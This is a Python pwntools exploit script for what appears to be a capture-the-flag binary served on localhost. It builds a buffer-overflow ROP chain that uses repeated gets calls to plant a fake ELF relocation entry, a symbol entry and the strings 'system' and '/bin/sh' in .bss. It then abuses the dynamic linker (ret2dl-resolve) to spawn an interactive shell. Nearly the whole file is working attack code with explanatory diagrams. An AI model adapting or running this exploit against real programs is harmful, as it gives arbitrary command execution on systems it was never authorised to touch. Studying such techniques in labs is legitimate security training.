from pwn import *

filename = './chall'
chall = ELF(filename)

# docker-compose up
conn = remote('localhost', 9001)
# conn = process(filename)

plt = chall.get_section_by_name('.plt').header.sh_addr
bss = chall.get_section_by_name('.bss').header.sh_addr
rel = chall.get_section_by_name('.rel.plt').header.sh_addr
dynsym = chall.get_section_by_name('.dynsym').header.sh_addr
dynstr = chall.get_section_by_name('.dynstr').header.sh_addr
gets_got = chall.got['gets']
gets_plt = chall.plt['gets']

# 0x08049022: pop ebx; ret;
pop_ret = 0x08049022

# .bss section
# |-----------+---------------------------+---------|
# | Elf32_Rel | r_offset                  | 8 byte  |
# |           | r_info                    |         |
# |-----------+---------------------------+---------|
# |           |                           | 8 byte  |
# |           |                           | (align) |
# |-----------+---------------------------+---------|
# | Elf32_Sym | st_name                   | 16 byte |
# |           | st_value                  |         |
# |           | st_size                   |         |
# |           | st_info st_other st_shndx |         |
# |-----------+---------------------------+---------|
# |           |                           | 4byte   |
# |-----------+---------------------------+---------|
# | symbol    | 'system'                  | 4byte   |
# |-----------+---------------------------+---------|
# |           |                           | 4byte   |
# |-----------+---------------------------+---------|
# | argment   | '/bin/sh'                 | 4byte   |
# |-----------+---------------------------+---------|
# |           |                           |         |

fake_elf32_rel_addr = bss

fake_elf32_sym_addr = fake_elf32_rel_addr + 0x10

system_symbol_addr = fake_elf32_sym_addr + 0x14

sh_symbol_addr = system_symbol_addr + 0x1c

# calc index of Elf32_Rel from .rel.plt
reloc_arg = fake_elf32_rel_addr - rel

# padding
buf = b'A'*0x84                  # fill stack
buf += p32(0xdeadbeaf)           # saved_ebp

# gets(fake_elf32_rel_addr)
buf += p32(gets_plt)             # main return addr
buf += p32(pop_ret)              # gets return addr
buf += p32(fake_elf32_rel_addr)  # gets arg

# gets(fake_elf32_sym_addr)
buf += p32(gets_plt)             # pop ret return addr
buf += p32(pop_ret)              # gets return addr
buf += p32(fake_elf32_sym_addr)  # gets arg

# gets(system_symbol_addr)
buf += p32(gets_plt)             # pop ret return addr
buf += p32(pop_ret)              # gets return addr
buf += p32(system_symbol_addr)   # gets arg

# gets(sh_symbol_addr)
buf += p32(gets_plt)             # pop ret return addr
buf += p32(pop_ret)              # gets return  addr
buf += p32(sh_symbol_addr)       # gets arg

# system('/bin/sh')
buf += p32(plt)                  # pop ret return addr
buf += p32(reloc_arg)            # reloc arg
buf += p32(0xdeadbeef)           # retrun address of system
buf += p32(sh_symbol_addr)       # system arg

conn.sendline(buf)

# create Elf32_Rel
###################################################################################
# typedef struct
# {
#     Elf32_Addr	r_offset;		/* Address */
#     Elf32_Word	r_info;			/* Relocation type and symbol index */
# } Elf32_Rel;
###################################################################################
r_offset = gets_got
r_info   = ((fake_elf32_sym_addr - dynsym)//0x10)<<8 | 7

# |-----------+---------------------------+---------|
# | Elf32_Rel | r_offset                  | 8 byte  |
# |           | r_info                    |         |
# |-----------+---------------------------+---------|
Elf32_Rel = p32(r_offset)
Elf32_Rel += p32(r_info)
    
conn.sendline(Elf32_Rel)

# create Elf32_Sym
###################################################################################
# typedef struct
# {
#     Elf32_Word	st_name;		/* Symbol name (string tbl index) */
#     Elf32_Addr	st_value;		/* Symbol value */
#     Elf32_Word	st_size;		/* Symbol size */
#     unsigned char st_info;		/* Symbol type and binding */
#     unsigned char st_other;		/* Symbol visibility */
#     Elf32_Section st_shndx;		/* Section index */
# } Elf32_Sym;
###################################################################################
st_name = system_symbol_addr - dynstr
st_value = 0x0
st_size = 0x0
st_info = 0x12
st_other = 0x0
st_shndx = 0x0

# |-----------+---------------------------+---------|
# | Elf32_Sym | st_name                   | 16 byte |
# |           | st_value                  |         |
# |           | st_size                   |         |
# |           | st_info st_other st_shndx |         |
# |-----------+---------------------------+---------|
Elf32_Sym = p32(st_name)
Elf32_Sym += p32(st_value)
Elf32_Sym += p32(st_size)
Elf32_Sym += p8(st_info)
Elf32_Sym += p8(st_other)
Elf32_Sym += p16(st_shndx)

conn.sendline(Elf32_Sym)

# create system symbol
# |-----------+---------------------------+---------|
# | symbol    | 'system'                  | 4byte   |
# |-----------+---------------------------+---------|
conn.sendline(b'system')

# create sh symbol
# |-----------+---------------------------+---------|
# | argment   | '/bin/sh'                 | 4byte   |
# |-----------+---------------------------+---------|
conn.sendline(b'/bin/sh')

conn.interactive()

